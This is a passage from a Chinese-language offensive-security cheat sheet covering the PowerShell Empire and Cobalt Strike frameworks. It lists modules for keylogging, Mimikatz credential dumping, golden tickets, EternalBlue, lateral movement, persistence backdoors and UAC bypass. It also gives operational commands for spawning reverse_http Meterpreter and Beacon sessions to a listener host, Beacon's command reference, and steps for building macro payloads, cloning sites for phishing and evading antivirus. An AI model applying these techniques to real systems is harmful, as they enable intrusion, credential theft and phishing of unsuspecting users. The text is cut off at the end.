| collection/WebcamRecorder                       | 从摄像头捕获视频                                             |
| collection/browser_data                         | 搜索浏览器历史记录或书签                                     |
| collection/clipboard_monitor                    | 按指定的时间间隔监视剪贴板                                   |
| collection/file_finder                          | 查找域中的敏感文件                                           |
| collection/find_interesting_file                | 查找域中的敏感文件                                           |
| collection/get_indexed_item                     | 获取Windows desktop search索引文件                           |
| collection/get_sql_column_sample_data           | 从目标SQL Server返回列信息。                                 |
| collection/get_sql_query                        | 在目标SQL服务器上执行查询                                    |
| collection/inveigh                              | Windows PowerShell LLMNR/mDNS/NBNS中间人工具                 |
| collection/keylogger                            | 键盘记录到keystrokes.txt文件中，文件位置/downloads/agentname/keystrokes.txt/agentname |
| collection/minidump                             | 进程的全内存转储，PowerSploit的Out-Minidump.ps1              |
| collection/netripper                            | 将NetRipper注入目标进程，该进程使用API挂钩以拦截来自低特权用户的网络流量和与加密相关的功能，从而能够在加密之前/解密之后捕获纯文本流量和加密流量。 |
| collection/ninjacopy*                           | 通过读取原始卷并解析NTFS结构，从NTFS分区卷中复制文件。       |
| collection/packet_capture*                      | 使用netsh在主机上启动数据包捕获。                            |
| collection/prompt                               | 提示当前用户在表单框中输入其凭据，然后返回结果。             |
| collection/screenshot                           | 屏幕截图                                                     |
| collection/vaults/add_keepass_config_trigger    | 寻找KeePass配置                                              |
| collection/vaults/find_keepass_config           | 此模块查找并解析KeePass.config.xml (2.X)和KeePass.config.xml (1.X)文件。 |
| collection/vaults/get_keepass_config_trigger    | 该模块从KeePass 2.X配置XML文件中提取触发器说明               |
| collection/vaults/keethief                      | 此模块检索未锁定的KeePass数据库的database mastey key信息     |
| collection/vaults/remove_keepass_config_trigger | 该模块从Find-KeePassConfig找到的所有KeePass配置中删除所有触发器 |

```
>usemodule collection/ tab补齐查看模块
>usemodule collection/screenshot 获取当前桌面截图，文件存储在./Empire/download/agent名字/screenshot
>usemodule collection/keylogger 键盘记录，文件存储在./Empire/download/agent名字/agent.log
>usemodule situational_awareness/host/winenum 查看当前用户、AD组、剪切板内容、系统版本、共享、网络信息、防火墙规则
>usemodule situational_awareness/network/powerview/share_finder 列出域内所有共享
>usemodule situational_awareness/network/arpscan 
>set Range 192.168.0.1-192.168.0.100 ARP扫描，需设置扫描网段区间
>usemodule situational_awareness/network/portscan 
>set Hosts 192.168.0.1-192.168.0.100 端口扫描，需设置IP或IP段
>usemodule situational_awareness/network/reverse_dns DNS信息，需设置IP
>set Range 192.168.0.1-192.168.0.100
>usemodule situational_awareness/network/powerview/get_domain_controller 查找域控
```

#### Code_execution（代码执行）  code_execution)

| 模块名                                      | 功能                                                         |
| :------------------------------------------ | :----------------------------------------------------------- |
| code_execution/invoke_dllinjection          | 使用PowerSploit的Invoke-DLLInjection将Dll注入您选择的进程ID。 |
| code_execution/invoke_metasploitpayload     | 生成一个新的隐藏PowerShell窗口，该窗口下载并执行Metasploit Payload。这与Metasploit模块theexploit/multi/scripts/web_delivery互动 |
| code_execution/invoke_ntsd                  | 使用NT Symbolic Debugger执行Empire launcher代码              |
| code_execution/invoke_reflectivepeinjection | 使用PowerSploit的Invoke-ReflectivePEInjection进行反射PE注入，将DLL/EXE加载进PowerShell进程中，或者将DLL加载进远程进程中 |
| code_execution/invoke_shellcode             | 使用PowerSploit的Invoke--Shellcode注入Shellcode              |
| code_execution/invoke_shellcodemsil         | 执行shellcode                                                |

#### Credentials（身份凭证）  credentials)

| 模块名                               | 功能                                                         |
| :----------------------------------- | :----------------------------------------------------------- |
| credentials/credential_injection*    | 运行PowerSploit的Invoke-CredentialInjection创建具有明文凭证的登录，而不会触发事件ID 4648使用显式凭据尝试登录 |
| credentials/enum_cred_store          | 从Windows凭据管理器中转储当前交互用户的纯文本凭据            |
| credentials/invoke_kerberoast        | 为具有非空服务主体名称（SPN）的所有用户请求kerberos票据，并将其提取为John或Hashcat可用格式 |
| credentials/powerdump*               | 使用Posh-SecMod的Invoke-PowerDump从本地系统中转储哈希        |
| credentials/sessiongopher            | 提取WinSCP已保存的会话和密码                                 |
| credentials/tokens                   | 运行PowerSploit的Invoke-TokenManipulation枚举可用的登录令牌，并使用它们创建新的进程 |
| credentials/vault_credential*        | 运行PowerSploit的Get-VaultCredential以显示Windows Vault凭证对象，包括明文Web凭证 |
| credentials/mimikatz/cache*          | 运行PowerSploit的Invoke-Mimikatz函数以提取MSCache(v2) hashes |
| credentials/mimikatz/certs*          | 运行PowerSploit的Invoke-Mimikatz函数将所有证书提取到本地目录 |
| credentials/mimikatz/command*        | 使用自定义命令运行PowerSploit的Invoke-Mimikatz函数           |
| credentials/mimikatz/dcsync          | 运行PowerSploit的Invoke-Mimikatz函数，以通过Mimikatz的lsadump::dcsync模块提取给定的帐户密码 |
| credentials/mimikatz/dcsync_hashdump | 运行PowerSploit的Invoke-Mimikatz函数，以使用Mimikatz的lsadump::dcsync模块收集所有域哈希 |
| credentials/mimikatz/extract_tickets | 运行PowerSploit的Invoke-Mimikatz函数，以base64编码形式从内存中提取kerberos票据 |
| credentials/mimikatz/golden_ticket   | 运行PowerSploit的Invoke-Mimikatz函数以生成黄金票据并将其注入内存 |
| credentials/mimikatz/keys*           | 运行PowerSploit的Invoke-Mimikatz函数以将所有密钥提取到本地目录 |
| credentials/mimikatz/logonpasswords* | 运行PowerSploit的Invoke-Mimikatz函数以从内存中提取纯文本凭据。 |
| credentials/mimikatz/lsadump*        | 运行PowerSploit的Invoke-Mimikatz函数以从内存中提取特定的用户哈希。 在域控制器上很有用。 |
| credentials/mimikatz/mimitokens*     | 运行PowerSploit的Invoke-Mimikatz函数以列出或枚举令牌。       |
| credentials/mimikatz/pth*            | 运行PowerSploit的Invoke-Mimikatz函数以执行sekurlsa::pth来创建一个新进程。 |
| credentials/mimikatz/purge           | 运行PowerSploit的Invoke-Mimikatz函数从内存中清除所有当前的kerberos票据 |
| credentials/mimikatz/sam*            | 运行PowerSploit的Invoke-Mimikatz函数从安全帐户管理器（SAM）数据库中提取哈希 |
| credentials/mimikatz/silver_ticket   | 运行PowerSploit的Invoke-Mimikatz函数，以生成服务器/服务的白银票据并将其注入内存。 |
| credentials/mimikatz/trust_keys*     | 运行PowerSploit的Invoke-Mimikatz函数，从域控制器中提取域信任密钥。 |
| #### Exfiltration（数据窃取）        |                                                              |

| 模块名                     | 功能                                                         |
| :------------------------- | :----------------------------------------------------------- |
| exfiltration/egresscheck   | 可用于帮助检查主机与客户端系统之间的出口，详细信息：https://github.com/stufus/egresscheck-framework |
| exfiltration/exfil_dropbox | 下载文件到dropbox                                            |

#### Exploitation（漏洞利用EXP）  exploitationexp)

| 模块名                           | 功能                                      |
| :------------------------------- | :---------------------------------------- |
| exploitation/exploit_eternalblue | MS17_010永恒之蓝漏洞利用                  |
| exploitation/exploit_jboss       | Jboss漏洞利用                             |
| exploitation/exploit_jenkins     | 在未授权访问的Jenkins脚本控制台上运行命令 |

#### Lateral_movement（横向移动）  lateral_movement)

| 模块名                                  | 功能                                                         |
| :-------------------------------------- | :----------------------------------------------------------- |
| lateral_movement/inveigh_relay          | smb中继攻击                                                  |
| lateral_movement/invoke_dcom            | 使用DCOM在远程主机上执行stager                               |
| lateral_movement/invoke_executemsbuild  | 该模块利用WMI和MSBuild编译并执行一个包含Empire launcher的xml文件。 |
| lateral_movement/invoke_psexec          | PsExec横向移动                                               |
| lateral_movement/invoke_psremoting      | 远程PowerShell横向移动                                       |
| lateral_movement/invoke_smbexec         | SMBExec横向移动                                              |
| lateral_movement/invoke_sqloscmd        | 利用xp_cmdshell横向移动                                      |
| lateral_movement/invoke_sshcommand      | 利用SSH横向移动                                              |
| lateral_movement/invoke_wmi             | 利用WMI横向移动                                              |
| lateral_movement/invoke_wmi_debugger    | 使用WMI将远程机器上的二进制文件的调试器设置为cmd.exe或stager |
| lateral_movement/jenkins_script_console | 利用未授权访问的Jenkins脚本控制台横向移动                    |
| lateral_movement/new_gpo_immediate_task | 利用GPO中的计划任务横向移动                                  |

#### Management（管理）  management)

| 模块名                                 | 功能                                                         |
| :------------------------------------- | :----------------------------------------------------------- |
| management/enable_rdp*                 | 在远程计算机上启用RDP并添加防火墙例外。                      |
| management/disable_rdp*                | 在远程计算机上禁用RDP                                        |
| management/downgrade_account           | 在给定的域帐户上设置可逆加密，然后强制下次用户登录时设置密码。 |
| management/enable_multi_rdp*           | 允许多个用户建立同时的RDP连接。                              |
| management/get_domain_sid              | 返回当前指定域的SID                                          |
| management/honeyhash*                  | 将人工凭证注入到LSASS                                        |
| management/invoke_script               | 运行自定义脚本                                               |
| management/lock                        | 锁定工作站的显示                                             |
| management/logoff                      | 从计算机上注销当前用户（或所有用户）                         |
| management/psinject                    | 利用Powershell注入Stephen Fewer形成的ReflectivePick，该ReflectivePick在远程过程中从内存执行PS代码 |
| management/reflective_inject           | 利用Powershell注入Stephen Fewer形成的ReflectivePick，该ReflectivePick在远程过程中从内存执行PS代码 |
| management/restart                     | 重新启动指定的机器                                           |
| management/runas                       | 绕过GPO路径限制                                              |
| management/shinject                    | 将PIC Shellcode Payload注入目标进程                          |
| management/sid_to_user                 | 将指定的域sid转换为用户                                      |
| management/spawn                       | 在新的powershell.exe进程中生成新agent                        |
| management/spawnas                     | 使用指定的登录凭据生成agent                                  |
| management/switch_listener             | 切换listener                                                 |
| management/timestomp                   | 通过'调用Set-MacAttribute执行类似耗时的功能                  |
| management/user_to_sid                 | 将指定的domain\user转换为domain sid                          |
| management/vnc                         | Invoke-Vnc在内存中执行VNC代理并启动反向连接                  |
| management/wdigest_downgrade*          | 将计算机上的wdigest设置为使用显式凭据                        |
| management/zipfolder                   | 压缩目标文件夹以供以后渗透                                   |
| management/mailraider/disable_security | 此函数检查ObjectModelGuard                                   |
| management/mailraider/get_emailitems   | 返回指定文件夹的所有项目                                     |
| management/mailraider/get_subfolders   | 返回指定顶级文件夹中所有文件夹的列表                         |
| management/mailraider/mail_search      | 在给定的Outlook文件夹中搜索项目                              |
| management/mailraider/search_gal       | 返回与指定搜索条件匹配的所有exchange users                   |
| management/mailraider/send_mail        | 使用自定义或默认模板将电子邮件发送到指定地址。               |
| management/mailraider/view_email       | 选择指定的文件夹，然后在指定的索引处输出电子邮件项目         |

#### Persistence（持久化）  persistence)

| 模块名                                        | 功能                                                         |
| :-------------------------------------------- | :----------------------------------------------------------- |
| persistence/elevated/registry*                | 计算机启动项持久化，通过HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run进行持久化，运行一个stager或者脚本 |
| persistence/elevated/schtasks*                | 计划任务持久化                                               |
| persistence/elevated/wmi*                     | WMI事件订阅持久化                                            |
| persistence/elevated/wmi_updater*             | WMI订阅持久化                                                |
| persistence/misc/add_netuser                  | 将域用户或本地用户添加到当前（或远程）计算机                 |
| persistence/misc/add_sid_history*             | 运行PowerSploit的Invoke-Mimikatz函数以执行misc::addsid以添加用户的sid历史记录。 仅适用于域控制器 |
| persistence/misc/debugger*                    | 将指定目标二进制文件的调试器设置为cmd.exe                    |
| persistence/misc/disable_machine_acct_change* | 禁止目标系统的机器帐户自动更改其密码                         |
| persistence/misc/get_ssps                     | 枚举所有已加载的安全软件包                                   |
| persistence/misc/install_ssp*                 | 安装安全支持提供程序dll                                      |
| persistence/misc/memssp*                      | 运行PowerSploit的Invoke-Mimikatz函数以执行misc::memssp，将所有身份验证事件记录到C:\Windows\System32\mimisla.log |
| persistence/misc/skeleton_key*                | 运行PowerSploit的Invoke-Mimikatz函数来执行misc::skeleton，植入密码mimikatz的万能钥匙。 仅适用于域控制器 |
| persistence/powerbreach/deaduser              | DeadUserBackdoor后门，详细信息：http://www.sixdub.net/?p=535 |
| persistence/powerbreach/eventlog*             | 启动事件循环后门                                             |
| persistence/powerbreach/resolver              | 启动解析器后门                                               |
| persistence/userland/backdoor_lnk             | LNK文件后门                                                  |
| persistence/userland/registry                 | 计算机启动项持久化，通过HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run进行持久化，运行一个stager或者脚本 |
| persistence/userland/schtasks                 | 计划任务持久化                                               |

#### Privesc（权限提升）  privesc)

| 模块名                              | 功能                                                         |
| :---------------------------------- | :----------------------------------------------------------- |
| privesc/ask                         | 弹出一个对话框，询问用户是否要以管理员身份运行powershell     |
| privesc/bypassuac                   | UAC bypass                                                   |
| privesc/bypassuac_env               | UAC bypass                                                   |
| privesc/bypassuac_eventvwr          | UAC bypass                                                   |
| privesc/bypassuac_fodhelper         | UAC bypass                                                   |
| privesc/bypassuac_sdctlbypass       | UAC bypass                                                   |
| privesc/bypassuac_tokenmanipulation | UAC bypass                                                   |
| privesc/bypassuac_wscript           | UAC bypass                                                   |
| privesc/getsystem*                  | 获取system特权                                               |
| privesc/gpp                         | 利用windows组策略首选项缺陷获取系统帐号                      |
| privesc/mcafee_sitelist             | 寻找McAfee SiteList.xml文件的纯文本密码                      |
| privesc/ms16-032                    | MS16-032本地提权                                             |
| privesc/ms16-135                    | MS16-135本地提权                                             |
| privesc/tater                       | 利用PowerShell实现的Hot Potato提权                           |
| privesc/powerup/allchecks           | 检查目标主机的攻击向量以进行权限提升                         |
| privesc/powerup/find_dllhijack      | 查找通用的.DLL劫持                                           |
| privesc/powerup/service_exe_restore | 还原备份的服务二进制文件                                     |
| privesc/powerup/service_exe_stager  | 备份服务的二进制文件，并用启动stager.bat的二进制文件替换原始文件 |
| privesc/powerup/service_exe_useradd | 修改目标服务以创建本地用户并将其添加到本地管理员             |
| privesc/powerup/service_stager      | 修改目标服务以执行Empire stager                              |
| privesc/powerup/service_useradd     | 修改目标服务以创建本地用户并将其添加到本地管理员             |
| privesc/powerup/write_dllhijacker   | 将可劫持的.dll以及.dll调用的stager.bat一起写到指定路径。 wlbsctrl.dll在Windows 7上运行良好。需要重新启动计算机 |

#### Recon（侦察）  recon)

| 模块名                                | 功能                                    |
| :------------------------------------ | :-------------------------------------- |
| recon/find_fruit                      | 在网络范围内搜索潜在的易受攻击的Web服务 |
| recon/get_sql_server_login_default_pw | 发现在当前广播域之内的SQL Server实例    |
| recon/http_login                      | 针对基本身份验证测试凭据                |

#### Situational_awareness（态势感知）  situational_awareness)

| 模块名                                                       |                                                              |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| situational_awareness/host/antivirusproduct                  | 获取防病毒产品信息                                           |
| situational_awareness/host/computerdetails*                  | 枚举有关系统的有用信息                                       |
| situational_awareness/host/dnsserver                         | 枚举系统使用的DNS服务器                                      |
| situational_awareness/host/findtrusteddocuments              | 该模块将枚举适当的注册表                                     |
| situational_awareness/host/get_pathacl                       | 枚举给定文件路径的ACL                                        |
| situational_awareness/host/get_proxy                         | 枚举当前用户的代理服务器和WPAD内容                           |
| situational_awareness/host/get_uaclevel                      | 枚举UAC级别                                                  |
| situational_awareness/host/monitortcpconnections             | 监视主机与指定域名或IPv4地址的TCP连接，对于会话劫持和查找与敏感服务进行交互的用户很有用 |
| situational_awareness/host/paranoia*                         | 持续检查运行过程中是否存在可疑用户                           |
| situational_awareness/host/winenum                           | 收集有关主机和当前用户上下文的相关信息                       |
| situational_awareness/network/arpscan                        | 针对给定范围的IPv4 IP地址执行ARP扫描                         |
| situational_awareness/network/bloodhound                     | 执行BloodHound数据收集                                       |
| situational_awareness/network/get_exploitable_system         | 查询Active Directory以查找可能容易受到Metasploit Exploit的系统 |
| situational_awareness/network/get_spn                        | 获取服务主体名称（SPN）                                      |
| situational_awareness/network/get_sql_instance_domain        | 返回SQL Server实例列表                                       |
| situational_awareness/network/get_sql_server_info            | 从目标SQL Server返回基本服务器和用户信息                     |
| situational_awareness/network/portscan                       | 使用常规套接字进行简单的端口扫描                             |
| situational_awareness/network/reverse_dns                    | 执行给定IPv4 IP范围的DNS反向查找                             |
| situational_awareness/network/smbautobrute                   | 针对用户名/密码列表运行SMB暴力破解                           |
| situational_awareness/network/smbscanner                     | 在多台机器上测试用户名/密码组合                              |
| situational_awareness/network/powerview/find_foreign_group   | 枚举给定域的组的所有成员，并查找不在查询域中的用户           |
| situational_awareness/network/powerview/find_foreign_user    | 枚举在其主域之外的组中的用户                                 |
| situational_awareness/network/powerview/find_gpo_computer_admin | 获取计算机（或GPO）对象，并确定哪些用户/组对该对象具有管理访问权限 |
| situational_awareness/network/powerview/find_gpo_location    | 获取用户名或组名，并确定其具有通过GPO进行管理访问的计算机    |
| situational_awareness/network/powerview/find_localadmin_access | 在当前用户具有“本地管理员”访问权限的本地域上查找计算机       |
| situational_awareness/network/powerview/find_managed_security_group | 此功能检索域中的所有安全组                                   |
| situational_awareness/network/powerview/get_cached_rdpconnection | 使用远程注册表功能来查询计算机上“ Windows远程桌面连接客户端”的所有信息 |
| situational_awareness/network/powerview/get_computer         | 查询当前计算机对象的域                                       |
| situational_awareness/network/powerview/get_dfs_share        | 返回给定域的所有容错分布式文件系统的列表                     |
| situational_awareness/network/powerview/get_domain_controller | 返回当前域或指定域的域控制器                                 |
| situational_awareness/network/powerview/get_domain_policy    | 返回给定域或域控制器的默认域或DC策略                         |
| situational_awareness/network/powerview/get_domain_trust     | 返回当前域或指定域的所有域信任                               |
| situational_awareness/network/powerview/get_fileserver       | 返回从用户主目录提取的所有文件服务器的列表                   |
| situational_awareness/network/powerview/get_forest           | 返回有关给定域森林的信息                                     |
| situational_awareness/network/powerview/get_forest_domain    | 返回给定林的所有域                                           |
| situational_awareness/network/powerview/get_gpo              | 获取域中所有当前GPO的列表                                    |
| situational_awareness/network/powerview/get_group            | 获取域中所有当前组的列表                                     |
| situational_awareness/network/powerview/get_group_member     | 返回给定组的成员                                             |
| situational_awareness/network/powerview/get_localgroup       | 返回本地或远程计算机上指定本地组中所有当前用户的列表         |
| situational_awareness/network/powerview/get_loggedon         | 执行NetWkstaUserEnum Win32API调用以查询主动登录主机的用户    |
| situational_awareness/network/powerview/get_object_acl       | 返回与特定活动目录对象关联的ACL                              |
| situational_awareness/network/powerview/get_ou               | 获取域中所有当前OU的列表                                     |
| situational_awareness/network/powerview/get_rdp_session      | 在给定的RDP远程服务中查询活动会话和原始IP                    |
| situational_awareness/network/powerview/get_session          | 执行NetSessionEnum Win32API调用以查询主机上的活动会话        |
| situational_awareness/network/powerview/get_site             | 获取域中所有当前站点的列表                                   |
| situational_awareness/network/powerview/get_subnet           | 获取域中所有当前子网的列表                                   |
| situational_awareness/network/powerview/get_user             | 查询给定用户或指定域中用户的信息                             |
| situational_awareness/network/powerview/map_domain_trust     | 使用.CSV输出映射所有可访问的域信任                           |
| situational_awareness/network/powerview/process_hunter       | 查询远程机器的进程列表                                       |
| situational_awareness/network/powerview/set_ad_object        | 使用SID，名称或SamAccountName来查询指定的域对象              |
| situational_awareness/network/powerview/share_finder         | 在域中的计算机上查找共享                                     |
| situational_awareness/network/powerview/user_hunter          | 查找指定组的用户登录的机器                                   |

#### Trollsploit（恶作剧）  trollsploit)

| 模块名                     | 功能                                                         |
| :------------------------- | :----------------------------------------------------------- |
| trollsploit/get_schwifty   | 播放Schwifty视频，同时把计算机音量设置最大                   |
| trollsploit/message        | 发送一个消息框                                               |
| trollsploit/process_killer | 终止以特定名称开头的任何进程                                 |
| trollsploit/rick_ascii     | 生成一个新的powershell.exe进程运行Lee Holmes' ASCII Rick Roll |
| trollsploit/rick_astley    | 运行SadProcessor's beeping rickroll                          |
| trollsploit/thunderstruck  | 播放Thunderstruck视频，同时把计算机音量设置最大              |
| trollsploit/voicetroll     | 通过目标上的合成语音朗读文本                                 |
| trollsploit/wallpaper      | 将.jpg图片上传到目标机器并将其设置为桌面壁纸                 |
| trollsploit/wlmdr          | 在任务栏中显示气球提示                                       |

#### Empire Word  empire-word)

```
>usestager windows/launcher_bat生成bat木马，设置Listener
Word/Excel->插入->对象->由文件创建，选择bat，显示为图标，修改图标
Macro
>usestager windows/macro 设置Listener
Word/Excel->试图->宏->创建，复制macro进去
```

#### Empire派生Cobalt Strike和MSF  empirecobalt-strikemsf)

##### 派生MSF  msf_6)

```
可绕过杀软
Empire
>usemodule code_execution/invoke_shellcode
>set Lhost 192.168.0.1
>set Lport 4444
>set Payload reverse_http
MSF
>use exploit/multi/handler
>set payloadwindows/meterpreter/reverse_http
>set Lhost 192.168.31.247
>set lport 4444
>run
或Empire
>usemodule code_execution/invoke_metasploitpayload
>set URL http://SRVHOST:SRVPORT
MSF
#use exploit/multi/script/web_delivery
#set payload windows/x64/meterpreter/reverse_tcp
设置SRVHOST SRVPORT
```

##### 派生COBALT STRIKE  cobalt-strike_2)

```
创建监听器/windows/beacon_http/reverse_http 设置端口和主机
Empire
>usemodule code_execution/invoke_shellcode
>set Lhost 192.168.0.1
>set Lport 4444
>set Payload reverse_http
```

### Cobalt Strike  cobalt-strike_3)

#### 安装  _48)

```
需要JDK环境
>tar -xzvf jdk-8u191-linux-x64.tar.gz
```

#### 部署TeamServer  teamserver)

```
>./teamserver 192.168.0.107 123456
格式是外网IP和密码
```

#### 模块  _49)

```
New Connection：新建连接
Preferences：设置外观
Visualization：查看主机的不同形式
VPN Interfaces： VPN接口
Listeners：监听器
Script Interfaces：查看和加载CNA脚本
Close：关闭CS
```

#### 连接  _50)

![image](http://159.75.51.84:8000/img/212.png)

#### 监听器  _51)

```
创建
Cobalt Strike -> Listeners点击Add
```

![image](http://159.75.51.84:8000/img/213.png)

```
Beacon为CS内部监听器。
Foreign一般与MSF结合使用。
系统架构的支持
```

![image](http://159.75.51.84:8000/img/214.png)

#### 攻击模块  _52)

![image](http://159.75.51.84:8000/img/215.png)

| 名称                  | 功能                                                         |
| :-------------------- | :----------------------------------------------------------- |
| HTML Application      | 基于powershell的.hta格式的HTML Application木马，分为可执行文件、PowerShell、VBA三种方法 |
| MS Office Macro       | office宏病毒文件                                             |
| Payload Generator     | 基于C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA等语言的payload |
| USB/CD AutoPlay       | 利用USB/CD自动播放运行的木马                                 |
| Windows Dropper       | 捆绑器                                                       |
| Windows Executable    | 生成32位或64位的exe和基于服务的可执行文件、DLL等后门         |
| Windows Executable(S) | 生成可执行文件，支持powershell脚本，提供代理功能             |

```
Web Drive-by基于WEB的攻击模块
```

| 名称                  | 功能                                     |
| :-------------------- | :--------------------------------------- |
| Manage                | 管理开启的模块                           |
| Clone Site            | 克隆网站                                 |
| Host File             | 提供文件下载                             |
| Scripted Web Delivery | 基于Web的攻击Payload                     |
| Signed Applet Attack  | 运行java自签名的攻击模块                 |
| Smart Applet Attack   | 自动检测Java版本并利用已知的exploits攻击 |
| System Profiler       | 信息探测模块                             |

#### 视图模块  _53)

| Applications   | 显示靶机应用信息                   |
| :------------- | :--------------------------------- |
| Credentials    | 显示密码(hashdump和mimikatz获取的) |
| Downloads      | 下载文件                           |
| Event Log      | 事件日志                           |
| Keystrokes     | 键盘记录                           |
| Proxy Pivots   | 代理信息                           |
| Screenshots    | 屏幕截图                           |
| Script Console | 加载脚本                           |
| Targets        | 查看目标                           |
| Web Log        | 查看web日志                        |

```
创建powershell脚本
```

![image](http://159.75.51.84:8000/img/216.png) ![image](http://159.75.51.84:8000/img/217.png)

```
复制脚本到目标机执行即可上线.
```

![image](http://159.75.51.84:8000/img/218.png)

#### 交互  _54)

```
右键目标机Interact进入交互模式
Access  
Dump hashes 获取密码
Elevate 提权
Golden Ticket   黄金票据注入会话
Make token  制作令牌
Run Mimikatz    运行mimikatz
Spawn As    以靶机其他用户权限生成会话
Explore 
Browser Pivot   劫持浏览器
Desktop(VNC)    远程VNC
File Browser    文件管理
Net View    执行命令net view
Port scan   端口扫描
Process list    进程列表
Screenshot  截图
Pivoting        
SOCKS Server    代理
Listener    已获权限的机器当作监听器(反向端口转发)
Deploy VPN  部署VPN
Spawn   
派生会话：联动MSF或Armitage 
右键执行mimikatz即可获取hash及明文密码
```

![image](http://159.75.51.84:8000/img/219.png)

```
视图->凭证信息列出密码，类似empire的creds命令
```

![image](http://159.75.51.84:8000/img/220.png)

#### Beacon  beacon)

```
argue                     进程参数欺骗
blockdlls                  阻止子进程加载非Microsoft DLL
browserpivot              注入受害者浏览器进程
bypassuac                绕过UAC提升权限
cancel                    取消正在进行的下载
cd                        切换目录
checkin                   强制让被控端回连一次
clear                     清除beacon内部的任务队列
connect                   Connect to a Beacon peer over TCP
covertvpn                 部署Covert VPN客户端
cp                        复制文件
dcsync                    从DC中提取密码哈希
desktop                   远程桌面(VNC)
dllinject                   反射DLL注入进程
dllload                    使用LoadLibrary将DLL加载到进程中
download                 下载文件
downloads                列出正在进行的文件下载
drives                     列出目标盘符
elevate                    使用exp
execute                   在目标上执行程序(无输出)
execute-assembly         在目标上内存中执行本地.NET程序
exit                       终止beacon会话
getprivs                   Enable system privileges on current token
getsystem                 尝试获取SYSTEM权限
getuid                     获取用户ID
hashdump                  转储密码哈希值
help                       帮助
inject                      在注入进程生成会话
jobkill                     结束一个后台任务
jobs                       列出后台任务
kerberos_ccache_use       从ccache文件中导入票据应用于此会话
kerberos_ticket_purge     清除当前会话的票据
kerberos_ticket_use       Apply 从ticket文件中导入票据应用于此会话
keylogger                 键盘记录
kill                      结束进程
link                      Connect to a Beacon peer over a named pipe
logonpasswords            使用mimikatz转储凭据和哈希值
ls                        列出文件
make_token                创建令牌以传递凭据
mimikatz                  运行mimikatz
mkdir                     创建一个目录
mode dns                  使用DNS A作为通信通道(仅限DNS beacon)
mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)
mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)
mode http                 使用HTTP作为通信通道
mv                        移动文件
net                       net命令
note                      备注       
portscan                  进行端口扫描
powerpick                 通过Unmanaged PowerShell执行命令
powershell                通过powershell.exe执行命令
powershell-import         导入powershell脚本
ppid                      Set parent PID for spawned post-ex jobs
ps                        显示进程列表
psexec                    Use a service to spawn a session on a host
psexec_psh                Use PowerShell to spawn a session on a host
psinject                  在特定进程中执行PowerShell命令
pth                       使用Mimikatz进行传递哈希
pwd                       当前目录位置
reg                       Query the registry
rev2self                  恢复原始令牌
rm                        删除文件或文件夹
rportfwd                  端口转发
run                       在目标上执行程序(返回输出)
runas                     以其他用户权限执行程序
runasadmin                在高权限下执行程序
runu                      Execute a program under another PID
screenshot                屏幕截图
setenv                    设置环境变量
shell                     执行cmd命令
shinject                  将shellcode注入进程
shspawn                   启动一个进程并将shellcode注入其中
sleep                     设置睡眠延迟时间
socks                     启动SOCKS4代理
socks stop                停止SOCKS4
spawn                     Spawn a session 
spawnas                   Spawn a session as another user
spawnto                   Set executable to spawn processes into
spawnu                    Spawn a session under another PID
ssh                       使用ssh连接远程主机
ssh-key                   使用密钥连接远程主机
steal_token               从进程中窃取令牌
timestomp                 将一个文件的时间戳应用到另一个文件
unlink                    Disconnect from parent Beacon
upload                    上传文件
wdigest                   使用mimikatz转储明文凭据
winrm                     使用WinRM横向渗透
wmi                       使用WMI横向渗透
执行命令，在beacon模式下键入shell+命令
```

![image](http://159.75.51.84:8000/img/221.png)

```
>sleep 0 交互模式，立刻执行命令
注入DLL到某个进程
>dllload [pid] [c:\path\to\file.dll] DLL需在目标上
>kerberos_ticket_purge 清除票据
>kerberos_ccache_use    [/path/to/file.ccache]  从ccache文件导入票据
>kerberos_ticket_use [/path/to/file.ccache] 从ticket文件导入票据
>kill pid 结束进程
>timestomp [fileA]  [fileB] 修改文件时间戳
>getuid  获取当前用户
>steal_token [pid] 窃取进程ID
>rev2self 恢复原始令牌
>powershell-import  [/path/to/local/script.ps1] 导入PS模块 
>shinject [pid] <x86|x64> [/path/to/my.bin] 向进程注入shellcode
>socks  port在指定端口开启代理
>socks stop停止代理
>rportfwd [bind port]   [forward host]  [forward port]开启端口转发
```

#### 克隆网站  _55)

```
Attacks -> Web Drive-by -> System Profiler
Redirect url设置为目标站，登录成功会挑战到真实网站
钓鱼攻击->克隆网站
克隆地址写入要克隆的网站
Attack选择刚刚收集信息的网站
Web日志界面可记录键盘
```

![image](http://159.75.51.84:8000/img/222.png)

```
攻击->钓鱼攻击管理->web服务管理中，可kill掉刚刚的任务
```

![image](http://159.75.51.84:8000/img/223.png)

#### office宏  office)

![image](http://159.75.51.84:8000/img/224.png) ![image](http://159.75.51.84:8000/img/225.png) ![image](http://159.75.51.84:8000/img/226.png)

#### 钓鱼邮件  _56)

```
新克隆一个网站
```

![image](http://159.75.51.84:8000/img/227.png)

```
Embed URL选择克隆好的网站
```

![image](http://159.75.51.84:8000/img/228.png) ![image](http://159.75.51.84:8000/img/229.png) ![image](http://159.75.51.84:8000/img/230.png)

```
里面的超链接已经被Embed URL克隆好的URL替换掉了
```

![image](http://159.75.51.84:8000/img/231.png) ![image](http://159.75.51.84:8000/img/232.png)

```
若是要加载附件，需注意附件的免杀
```

#### 加载脚本  _57)

```
https://github.com/rsmudge/ElevateKit 提权脚本
>git clone https://github.com/rsmudge/ElevateKit.git
>git clone https://github.com/TheKingOfDuck/myScripts.git
Cobalt Strike -> Scripts 选择elevate.cna加载
提权的EXP列表就会增加已经加入的模块
```

#### 浏览器劫持  _58)

```
beacon 设为交互模式
beacon> sleep 0
[Beacon] → Explore → Browser Pivot
选择打对勾的注入，会返回一个proxy，服务器IP+端口
>chromium --no-sandbox --ignore-certificate-errors --proxy-server=服务器IP:端口
访问网址
```

#### 权限维持  _59)

```
https://github.com/DeEpinGh0st/Erebus
加载 cna 脚本
Cobalt Strike → Script Manager → Load → Erebus 中的 Main.cna
生成 Payload
Attacks → Packages→ Windows Executable(S)
Erebus → Persistence选择维持方法
```

#### 横向  _60)

```
扫描存活主机
>portscan ip/网段 ports端口 扫描协议(arp、icmp、none) 线程
>portscan 192.168.1.0/24 445 arp 100
或右键目标>扫描
点击工具栏的View–>Targets，查看端口探测后的存活主机。（Targets可自行添加）
Login->psexec进行hash传递登录
```

#### 隔离网络  _61)

##### 权限机中转  _62)

```
